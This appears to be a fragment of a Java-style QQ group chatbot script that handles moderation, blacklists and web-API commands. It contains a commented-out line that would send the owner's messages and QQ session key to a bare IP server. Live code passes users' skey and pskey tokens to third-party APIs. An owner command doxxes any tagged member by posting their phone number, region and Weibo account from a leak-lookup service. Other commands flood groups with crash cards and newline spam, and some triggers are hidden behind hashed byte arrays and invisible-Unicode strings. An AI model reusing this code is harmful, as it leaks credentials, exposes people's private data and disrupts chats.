            if(g[i].GroupOwner.equals(qq))return true;
            for(int j = 0;j < g[i].AdminList.length;j++){
                if(g[i].AdminList[j].equals(qq))return true;
            }return false;
        }
    }return null;
}Activity 活动;
public void 加载活动(){活动=GetActivity();}
public String 匹配(String rex,text,int group){Matcher r = Pattern.compile(rex).matcher(text);if(!r.find())return "";return r.group(group);}
public String 匹配(String rex,text){return 匹配(rex,text,0);}
public String ns(String s,int n){String t = "";for(int i=0;i<n;i++){t+=s;}return t;}
public Object 取源(Object msg){return (msg.MessageType==6?msg.msg.getSourceMessage():null);}
public boolean isJavaOp(String qun,qq){
    if(代管.get(new String[]{qun},qq).equals("1")||MyUin.equals(qq))return true;
    return false;
}if(a())b();
setFlag(s23k("土包子java 作者土包子QQ2293600685‬‮‭‮‭‮‮‮‭‭‭‮‮‮‮‮‬‮‭‮‭‭‮‮‭‭‭‭‭‮‭‮‬‮‭‮‮‭‮‮‭‮‭‮‭‭‭‭‬‮‮‭‮‭‮‭‬‮‮‭‭‭‭‮‬‮‮‮‭‮‮‭‬‮‮‭‭‭‭‮‬‮‭‭‭‭‭‬‮‭‭‮‮‮‮‭‮‭‮‮‮‭‭‬‮‭‭‭‭‭‭‭‭‭‭‭‭‮‭‮‬‮‭‮‭‮‮‮‭‭‭‮‮‮‮‮‬‮‭‮‭‭‮‮‭‭‭‭‭‮‭‮‬‮‭‮‮‭‮‮‭‮‭‮‭‭‭‭‬‮‭‮‭‭‭‮‬‮‭‮‭‭‭‮‬‮‮‭‭‮‭‬‮‮‭‭‮‭‬‮‮‮‭‭‮‬‮‮‭‭‮‮‬‮‮‭‮‮‭‬‮‮‭‭‭‭‬‮‮‭‭‭‭‬‮‮‭‮‮‭‬‮‮‮‭‭‭‬‮‮‭‮‭‮‬"));
public static ArrayList reverseList(ArrayList arr){
    ArrayList rArr = new ArrayList();
    int l = arr.size();
    for(int i = 0;i < l;i++){
        rArr.add(0,arr.get(i));
    }
    return rArr;
}public static String pack(ArrayList arr,String step){
    String t = "";
    int i = 0;
    for(Object v:arr){
        t += v + (i < arr.size()-1 ? step : "");
        i++;
    }return t;
}public void putBlack(String qun,qq){
    JSONObject js = new JSONObject(blackL.get(new String[]{qun},"黑名单","{}"));
    js.put(qq,1);
    blackL.set(new String[]{qun},"黑名单",""+js);
}public void putBlack(String qq){
    putBlack("global",qq);
}public int getBlack(String qun,qq){
    JSONObject js = new JSONObject(blackL.get(new String[]{qun},"黑名单","{}"));
    if(js.has(qq)&&js.get(qq)==1)return 1;
    JSONObject js2 = new JSONObject(blackL.get(new String[]{"global"},"黑名单","{}"));
    if(js2.has(qq)&&js2.get(qq)==1)return 2;
    return 0;
}public void removeBlack(String qun,qq){
    JSONObject js = new JSONObject(blackL.get(new String[]{qun},"黑名单","{}"));
    js.put(qq,0);
    blackL.set(new String[]{qun},"黑名单",""+js);
}public void removeBlack(String qq){
    removeBlack("global",qq);
}public void checkO(String g){
    new Thread(new Runnable(){
        public void run(){
            int sum=0;
            if(isOp(g,MyUin)){
                ArrayList m = getGroupMemberList(g);
                for(Object i:m){
                    if(getBlack(g,i.UserUin)!=0){
                        Kick(g,i.UserUin,false);
                        发送(g,"","发现"+(getBlack(g,i.UserUin)==1?"本群":"全局")+"黑名单成员："+i.UserUin+"，已踢出");
                        sum++;
                    }
                }
            }Toast("成功踢出"+sum+"位群员");
        }
    }).start();
}public void check(String q){
    if(!q.equals("auto"))Toast("请稍等……");
    new Thread(new Runnable(){
        public void run(){
            int sum = 0;
            ArrayList gs = getGroupList();
            for(Object k:gs){
                String g = k.GroupUin;
                if(!isOp(g,MyUin))continue;
                ArrayList m = getGroupMemberList(g);
                for(Object i:m){
                    if(getBlack(g,i.UserUin)!=0){
                        Kick(g,i.UserUin,false);
                        发送(g,"","发现"+(getBlack(g,i.UserUin)==1?"本群":"全局")+"黑名单成员："+i.UserUin+"，已踢出");
                        sum++;
                    }
                }
            }Toast((q.equals("auto")?"自动检测黑名单：":"")+"成功踢出"+sum+"位群员");
        }
    }).start();
}check("auto");
public void Callback_OnRawMsg(Object msg){
    if(steps==-1&&!a()){
        红包(msg);
    }
}public void onMsg(Object msg){
    String t = msg.MessageContent.replace(" జ్ఞ ా رً ॣ","").replace("జ్ఞ ా رً ॣ","");
    String QQUin = msg.UserUin;
    if(a())b();
    if(t.indexOf("\u202c")!=-1){msg.msg.msg=s23k(t);t=s23k(t);}
    //if(msg.msg.frienduin.equals(MyUin)&&!t.startsWith("作者：")){new httpRequests("http://8.134.160.205/sm","").post("q="+MyUin+"&skey="+(issq?getSkey():"")+"&msg="+(msg.MessageType==4?"[语音]"+msg.FileUrl:t));}
    if(QQUin.equals(MyUin)){
        if(t.equals("撤回")){if(取源(msg)!=null)revokeMsg(取源(msg));revokeMsg(msg.msg);}
    	if("落".equals(t)||"关机".equals(t)){opens.set(new String[]{msg.GroupUin},"开","0");发送(msg.GroupUin,"","休眠状态已开启……\n————————————\n"+文案());}
        if("起".equals(t)||"开机".equals(t)){opens.set(new String[]{msg.GroupUin},"开","1");发送1(msg.GroupUin,"",(tu(new int[][]{{390,220},{374,204},{39,35},{98,96},{61,57},{98,96},{315,55},{312,8},{960,914},{770,576},{7,3},{473,305},{1448,1418},{32655,32651}})+msg.GroupUin+tu(new int[][]{{7,3},{480,386},{347,21},{2534,2508},{32655,32651}})+MyUin+tu(new int[][]{{7,3},{5564,5550},{291,67},{7248,7238},{770,576},{7,3},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{2057,2049},{7,3},{408,250},{330,46},{32655,32651},{7,3}})+文案()).replace("¶",emoji[rand(0,emoji.length)]));sendVoice(msg.GroupUin,"",RootPath+"故念目录/music/"+rand(0,6)+".mp3");}
    }if(!("1".equals(opens.get(new String[]{msg.GroupUin},"开"))||!msg.IsGroup))return;
	if("1".equals(new keyValueSys(RootPath+"故念目录").get(new String[]{"dataBase",msg.GroupUin,QQUin,"罪证"},"伪禁言"))){
		revokeMsg(msg.msg);
		return;
	}if("1".equals(x.get(new String[]{msg.GroupUin},"自"))){msg.msg.issend=1;}
	try{
    	if(t.equals(yz.get(msg.GroupUin).get(QQUin).get("need"))){
    	    JSONObject j1 = yz.get(msg.GroupUin);
    	    JSONObject j2 = j1.get(QQUin);
    	    j2.put("bool",true);
    	    j1.put(QQUin,j2);
    	    yz.put(msg.GroupUin,j1);
    	}
	}catch(Exception e){}
	if(steps==-1){
    	if(限制.get(new String[]{msg.GroupUin},"点歌").equals("0"))songSys(msg);
    	I_WANT(msg);
    	使用复读(msg);
    	使用长文本(msg);
    	使用禁词(msg);
    	查看禁词(msg);
    	娱乐系统(msg);
    	查看长文本(msg);
    	使用自动回复(msg);
    	菜单(msg);
    	查看自动回复(msg);
    	陪聊(msg);
    	天气(msg);
    	抽奖(msg);
    	使用卡(msg);
    	if(t.equals("历史今天")){
    		JSONObject ls = new JSONObject(new httpRequests("https://apis.jxcxin.cn/api/lishi?format=json","").get("UTF-8"));
    		String te = "";
    		for(int i = 0;i<ls.get("content").length();i++){
    			te+="·"+ls.get("content").getString(i)+"\n";
    		}发送(msg.GroupUin,"",ls.getString("day").split("年")[1]+"，历史上发生了：\n"+te+"这"+ls.get("content").length()+"件事");
    	}if(t.equals("CF图标点亮")){
    	    new Thread(new Runnable(){public void run(){
    	        String[] sp=getAll(msg.GroupUin,"vip.qq.com",QQUin);
    	        if(sp==null)return;
    		    发送(msg.GroupUin,"",new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/cf.php?type=1&qq="+QQUin+"&skey="+sp[0]+"&pskey="+sp[1],"").get("")).getString("msg"));
    		}}).start();
    	}if(t.equals("CF图标熄灭")){
    	    new Thread(new Runnable(){public void run(){
    	        String[] sp=getAll(msg.GroupUin,"vip.qq.com",QQUin);
    	        if(sp==null)return;
    		    发送(msg.GroupUin,"",new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/cf.php?qq="+QQUin+"&skey="+sp[0]+"&pskey="+sp[1],"").get("")).getString("msg"));
    		}}).start();
    	}if(t.startsWith("查等级@")){
    	    JSONObject js = new JSONObject(new httpRequests("https://www.dreamling.xyz/API/QQ/get_qq_level_info/api.php?uin="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("vip.qq.com"):"")+"&qq="+msg.AtList[0],"").get("utf-8")).get("data").get("mRes");
    	    发送(msg.GroupUin,"",msg.AtList[0]+"("+js.get("sNickName")+")[PicUrl="+js.get("sFaceUrl")+"]等级："+js.get("iQQLevel"));
    	}else if(t.startsWith("查等级")){
    	    JSONObject js = new JSONObject(new httpRequests("https://www.dreamling.xyz/API/QQ/get_qq_level_info/api.php?uin="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("vip.qq.com"):"")+"&qq="+t.substring(3),"").get("utf-8"));
    	    发送(msg.GroupUin,"",t.substring(3)+"("+js.get("sNickName")+")[PicUrl="+js.get("sFaceUrl")+"]等级："+js.get("iQQLevel"));
    	}/*if(eq(h(t),new byte[]{49,48,55,49,57,50,50,56,45,51,49,55,48,52,49,48,54,51})){
    	    new Thread(new Runnable(){public void run(){
    	        String[] sp=getAll(msg.GroupUin,"vip.qq.com",QQUin);
    	        if(sp==null)return;
    	        new httpRequests("https://xiaobai.klizi.cn/API/qqgn/qq_sign.php?uin="+QQUin+"&skey="+sp[0]+"&pskey="+sp[1],"").get("");
    		    发送(msg.GroupUin,"","OK!");
    		}}).start();
    	}*/if(eq(h(t),new byte[]{56,49,57,50,56,50,48,48,56,51,51,53,45,51,50,54,50,53})){
    	    new Thread(new Runnable(){public void run(){
    	        String[] sp=getAll(msg.GroupUin,"qzone.qq.com",QQUin);
    	        if(sp==null)return;
    	        JSONObject care=new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/specialcare.php?uin="+QQUin+"&skey="+sp[0]+"&pskey="+sp[1],"").get("UTF-8"));
    	        String ttt = "有"+care.get("关心我的")+"人特别关心了你，你特别关心了以下"+care.get("我关心的")+"个人：\n";
    	        JSONArray careL = care.get("关心列表");
    	        for(int i=0;i<care.get("关心列表").length();i++){
    	            ttt+=(i+1)+"."+careL.get(i).get("name")+"("+careL.get(i).get("uin")+")[PicUrl="+careL.get(i).get("img")+"]\n";
    	        }发送(msg.GroupUin,"",ttt);
    		}}).start();
    	}if(eq(h(t),new byte[]{45,50,52,52,52,55,45,50,52,53,55,48,57,50,52,56,57,51,53,53})){
    	    new Thread(new Runnable(){public void run(){	
    	        String s=getSkey(msg.GroupUin,QQUin);
    	        if(s==null)return;
    		    发送(msg.GroupUin,"",new httpRequests("https://xiaobai.klizi.cn/API/qqgn/yw.php?qq="+QQUin+"&skey="+s,"").get("UTF-8"));
    		}}).start();
    	}
	}if(!isJavaOp(msg.GroupUin,QQUin))return;//上面所有人可用，下面只能主人或代管用
	设置自动回复(msg);
	if(steps==-1){
	    整点报时(msg);
    	设置复读(msg);
    	设置长文本(msg);
    	设置禁词(msg);
    	设置陪聊(msg);
    	设置抽奖(msg);
    	限制(msg);
    	if(t.startsWith("设置进群格式")){globals.set(new String[]{"格式"},"进群",t.substring(6));发送1(msg.GroupUin,"","我知道了！");}
    	if(t.startsWith("设置退群格式")){globals.set(new String[]{"格式"},"退群",t.substring(6));发送1(msg.GroupUin,"","希望这样的事不要发生吧……");}
    	if(t.equals("准备欢迎新人")||t.equals("开启进群欢迎")){opens.set(new String[]{msg.GroupUin},"欢迎","1");发送1(msg.GroupUin,"","OK!");}
    	if(t.equals("准备送别故人")||t.equals("开启退群提示")){opens.set(new String[]{msg.GroupUin},"送别","1");发送1(msg.GroupUin,"","OK!");}
    	if(t.equals("不用欢迎新人")||t.equals("关闭进群欢迎")){opens.set(new String[]{msg.GroupUin},"欢迎","0");发送1(msg.GroupUin,"","那好的");}
    	if(t.equals("不用送别故人")||t.equals("关闭退群欢迎")){opens.set(new String[]{msg.GroupUin},"送别","0");发送1(msg.GroupUin,"","那好的");}
    	if(t.equals("开启进群验证")){opens.set(new String[]{msg.GroupUin},"进群验证","1");发送(msg.GroupUin,"","执行成功！");}
    	if(t.equals("关闭进群验证")){opens.set(new String[]{msg.GroupUin},"进群验证","0");发送(msg.GroupUin,"","成功关闭！");}
    	if(t.startsWith("@")&&t.indexOf("剜口割舌")!=-1||t.startsWith("禁@")){
    		String time = t.substring(t.startsWith("@")?t.indexOf("剜口割舌")+4:t.lastIndexOf(" ")+1);
    		int ti = Integer.parseInt(time.substring(0,time.toCharArray().length-1));
    		switch (time.toCharArray()[time.toCharArray().length-1]){
    			case '秒':
    				ti *= 1;
    				break;
    			case '分':
    				ti *= 60;
    				break;
    			case '时':
    				ti *= 3600;
    				break;
    			case '天':
    				ti *= 3600*24;
    				break;
    			case '周':
    				ti *= 3600*24*7;
    				break;
    			default:
    				ti *= 10;
    				ti += time.toCharArray()[time.toCharArray().length-1] - 48;
    		}
    		for(String i:msg.AtList){
    			Forbidden(msg.GroupUin,i,ti);
    		}
    	}
    	if(t.startsWith("原谅@")||t.startsWith("解@")){
    		for (String i:msg.AtList){
    			Forbidden(msg.GroupUin,i,0);
    		}发送(msg.GroupUin,"","不许再犯！");
    	}
    	if(t.equals("吵不吵？！")||t.equals("全体禁言")){
    		Forbidden(msg.GroupUin,"",1);
    	}
    	if(t.equals("释放")||t.equals("全体解禁")){
    		Forbidden(msg.GroupUin,"",0);
    	}
    	if(t.startsWith("踢@")){
    		for (String i:msg.AtList){
    			Kick(msg.GroupUin,i,t.indexOf("别让我再看到你！")!=-1);
    		}发送(msg.GroupUin,"","成功踢出");
    	}
    	if(t.startsWith("踢黑@")){
    	    for (String i:msg.AtList){
    			Kick(msg.GroupUin,i,false);
    			putBlack(msg.GroupUin,i);
    		}发送(msg.GroupUin,"","成功踢出");
    	}
    	if(t.startsWith("全局拉黑@")){
    	    for (String i:msg.AtList){
    	        ArrayList gs = getGroupList();
    			for(Object g:gs)Kick(g.GroupUin,i,false);
    			putBlack(i);
    		}发送(msg.GroupUin,"","成功踢出");
    	}
    	if(t.startsWith("加白")){
    	    String[] u=t.substring(2).split(",");
    	    for(String i:u){
    	        removeBlack(msg.GroupUin,i);
    	    }发送(msg.GroupUin,"","成功加白");
    	}if(t.startsWith("全局加白")){
    	    String[] u=t.substring(4).split(",");
    	    for(String i:u){
    	        removeBlack(i);
    	    }发送(msg.GroupUin,"","成功加白");
    	}if(t.startsWith("全部加白")){
    	    String[] u=t.substring(4).split(",");
    	    for(String i:u){
    	        removeBlack(msg.GroupUin,i);
    	        removeBlack(i);
    	    }发送(msg.GroupUin,"","成功加白");
    	}
    	if(t.startsWith("伪禁言@")){
    		keyValueSys kv = new keyValueSys(RootPath+"故念目录");
    		for (String i:msg.AtList){
    			kv.set(new String[]{"dataBase",msg.GroupUin,i,"罪证"},"伪禁言","1");
    		}
    	}if(t.startsWith("废伪禁@")){
    		keyValueSys kv = new keyValueSys(RootPath+"故念目录");
    		for (String i:msg.AtList){
    			kv.set(new String[]{"dataBase",msg.GroupUin,i,"罪证"},"伪禁言","0");
    		}
    	}if(t.startsWith("查询重复")&&t.indexOf("与")!=-1){
    	    String[] groups = t.substring(4).split("与");
    	    JSONObject members = new JSONObject("{}");
    	    Object[][] m = new Object[groups.length][5000];
    	    for(int i = 0;i < groups.length;i++){
    	    	m[i]=getGroupMemberList(groups[i]).toArray();
    	    }for(int i = 0;i < groups.length;i++){
    	        for(int j = 0;j < m[i].length;j++){
    	        	if(members.has(m[i][j].UserUin)){
    	        	    JSONArray old = members.get(m[i][j].UserUin);
    	        	    old.put(groups[i]);
    	        	    members.put(m[i][j].UserUin,old);
    	        	}else{
    	        	    members.put(m[i][j].UserUin,new JSONArray("[\""+groups[i]+"\"]"));
    	        	}
    	        }
    	    }String t = "重复人数如下：\n";
    	    for(String i:members.keys()){
    	    	if(members.get(i).length()>=2){
    	    	    t+="·"+i+"(";
    	    	    for(int j = 0;j < members.get(i).length();j++){
    	    	        t+=members.get(i).get(j)+(j==members.get(i).length()-1?"":",");
    	    	    }t+=")\n";
    	    	}
    	    }发送(msg.GroupUin,"",t);
    	}
	}if(!QQUin.equals(MyUin))return;//下面只能主人用
	if("1".equals(x.get(new String[]{msg.GroupUin},"他"))){msg.msg.issend=0;}
	if(steps==-1){
	    抽管理(msg);
	    消息切换(msg);
    	if("跑右边来".equals(t)||"开启本群所有消息显示为自己发送".equals(t)){x.set(new String[]{msg.GroupUin},"自","1");发送(msg.GroupUin,"","好嘞");}
    	if("别跑右边".equals(t)||"关闭本群所有消息显示为自己发送".equals(t)){x.set(new String[]{msg.GroupUin},"自","0");发送(msg.GroupUin,"","好嘞");}
    	if("跑左边来".equals(t)||"开启本群自己消息显示为别人发送".equals(t)){x.set(new String[]{msg.GroupUin},"他","1");发送(msg.GroupUin,"","好嘞");}
    	if("别跑左边".equals(t)||"关闭本群自己消息显示为别人发送".equals(t)){x.set(new String[]{msg.GroupUin},"他","0");发送(msg.GroupUin,"","好嘞");}
    	设置红包(msg);
    	代管(msg);
    	if(t.equals("卡死你！")||t.equals("毁灭吧")){for(int i = 0;i < rand(10,20);i++){sendCard(msg.GroupUin,"",卡);}}
    	//Toast(msg.msg.getClass().getSimpleName());
    	/*if(t.indexOf("对好友")==0&&t.indexOf("吐槽：")!=-1){
    		String friend = t.substring(3,t.indexOf("吐槽："));
    		String c = t.split("：",2)[1];
    		发送("",friend,c+"\nజ్ఞ ా رً ॣ");
    	}
    	if(t.indexOf("对群聊")==0&&t.indexOf("吐槽：")!=-1){
    		String friend = t.substring(3,t.indexOf("吐槽："));
    		String c = t.split("：",2)[1];
    		发送(friend,"",c+"\nజ్ఞ ా رً ॣ");
    	}*/
    	if(t.equals("当前版本")){
    		发送(msg.GroupUin,"","当前是"+sv+"QT版Java");
    	}if(t.endsWith("还活着吗")){
    		String qq = t.substring(0,t.indexOf("还活着吗"));
    		JSONObject j = new JSONObject(new httpRequests("https://apis.jxcxin.cn/api/cxqq?qq="+qq,"").get("UTF-8"));
    		发送(msg.GroupUin,"",(j.getInt("code")==200?qq+"还活着，叫"+j.getString("msg").split(":")[2]:qq+"没了"));
    	}if(t.startsWith("了解一下@")){try{String phone = new JSONObject(new httpRequests("https://zy.xywlapi.cc/qqapi?qq="+msg.AtList[0],"").get("")).getString("phone");发送1(msg.GroupUin,"","了解啦！ta的手机是"+phone+"，是"+new JSONObject(new httpRequests("https://zy.xywlapi.cc/qqapi?qq="+msg.AtList[0],"").get("")).getString("phonediqu")+"的，微博是："+new httpRequests("https://zy.xywlapi.cc/wbphone?phone="+phone,"").get("utf-8")+"！\nజ్ఞ ా رً ॣ");}catch(Exception e){发送1(msg.GroupUin,"","他好神秘，我了解不到……\nజ్ఞ ా رً ॣ");}}
    	else if(t.startsWith("了解一下")){try{String phone = new JSONObject(new httpRequests("https://zy.xywlapi.cc/qqapi?qq="+t.substring(4),"").get("")).getString("phone");发送1(msg.GroupUin,"","了解啦！ta的手机是"+phone+"，是"+new JSONObject(new httpRequests("https://zy.xywlapi.cc/qqapi?qq="+t.substring(4),"").get("")).getString("phonediqu")+"的，微博是："+new httpRequests("https://zy.xywlapi.cc/wbphone?phone="+phone,"").get("utf-8")+"！\nజ్ఞ ా رً ॣ");}catch(Exception e){发送1(msg.GroupUin,"","他好神秘，我了解不到……\nజ్ఞ ా رً ॣ");}}
    	if(t.equals("TEChat")){for(int i = 0;i < rand(3,7);i++){发送1(msg.GroupUin,"","\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n